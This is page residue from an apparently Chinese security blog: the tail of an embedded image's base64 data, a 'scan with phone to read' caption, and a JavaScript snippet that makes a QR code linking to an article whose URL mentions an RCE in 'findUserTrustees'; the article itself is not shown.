QDQg80PbCtrREPB/Y5iBj0j/qPlPb4Z25Ie0b/585qyM0aeOondejXzOuHmXPsFfplJOvMVZh1ow/zOnIN6815LKw48aNBzDHyeexawszbFz+aYxnXDcm7cQO/vam7e9WaHBNCnBb5NgiuyoXXMaBKnThgewOF+g0RehzCdxGIMRyj9RX6+Qodly+DXldjGXQOwnfeHq4bsrczF/GrIRdt/N607U0d9q8URAz6SwV0zsV1TWUeCzUeDSJXcRsEBx0dG/M1rmLmKlTOaNZl3lxGx2FeGwSX9TBzOX7krxtytDsXxKY3dZ8Godcj31ZxjsF8MiA46OgaGV0jI/QceO27Xq5hDiLfY6F1EDFA9GTA9mFiCjwI16jwEf70Y92Qwy37/uD0HgJxGuA8jsuGnludnIpzDei55o4w17IOztWA0DkvI0QMyPSuD2y3CNjVKAAc6tYN0S7dyFZDbtQMLaU1JF/9M76SP2NwfFUh4lXNo/W80kPUdQ2IMdBSHROalG8zd4TWCv9G1xpyVGTFvm8HpoYA7U0HZv9oaTodo0HUyDwEBx1z3P7RXI5Br3HEOVYh/HkN6Lnw7Oe5/Jygaxx3TDg1xKKF1+zAasg1+7476yUN0dUcDfpVhvC9angemxfmOhrLKg6iRo7ZV84Zs15ovfzRHKswayHWBB0vaUi10J/EHT3XtzYEeqchfE8OMQZMlZhPUCkYSKB9CHEudG6Q/9UQ5roQXC7sdWTurP/WhpyddOn2d2A1ZH9vLolMDfF128OjVVY5lR7imkPHSjfWg1mfNRDxXMtxcxAa6OhYRuftobWOw1zPMSFE3HlC8aNNDZFw2XU70BoC0UE4h0dLhl7DunwSjjjHhNDrAKImA6Y39SyCiGfuT32IWkArAWzzV88PIgY0feUAWw1g/QNmHzf7ajfkZuv6scv5HwAAAP//fE910gAAAAZJREFUAwBR/qO5TR65cQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/trwfe-findUserTrustees-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 